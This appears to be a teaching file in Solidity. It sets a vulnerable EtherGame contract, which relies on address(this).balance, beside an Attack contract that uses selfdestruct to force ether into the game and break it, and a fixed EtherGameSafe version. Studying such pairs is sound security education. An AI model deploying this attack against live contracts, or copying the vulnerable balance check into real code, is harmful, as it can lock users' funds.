pragma solidity ^0.8.13;

contract EtherGame {

    uint public targetAmount = 7 ether;

    address public winner;

    function deposit() public payable {

        require(msg.value == 1 ether);

        uint balance = address(this).balance;

        require(balance <= targetAmount);

        if (balance == targetAmount) {
            
            winner = msg.sender;
        }
    }

    function claimReward() public {

        require(msg.sender == winner);

        (bool sent, ) = msg.sender.call{ value: address(this).balance }("");

        require(sent);
    }

}

contract Attack {

    EtherGame etherGame;

    constructor(address _etherGame) {

        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {

        address payable addr = payable(address(etherGame));

        selfdestruct(addr);
    }

}

contract EtherGameSafe {

    uint public targetAmount = 7 ether;

    uint public balance;

    address public winner;

    function deposit() public payable {

        require(msg.value == 1 ether);

        balance += msg.value;

        require(balance <= targetAmount);

        if (balance == targetAmount) {
            
            winner = msg.sender;
        }
    }

    function claimReward() public {

        require(msg.sender == winner);

        (bool sent, ) = msg.sender.call{ value: balance }("");

        require(sent);
    }

}
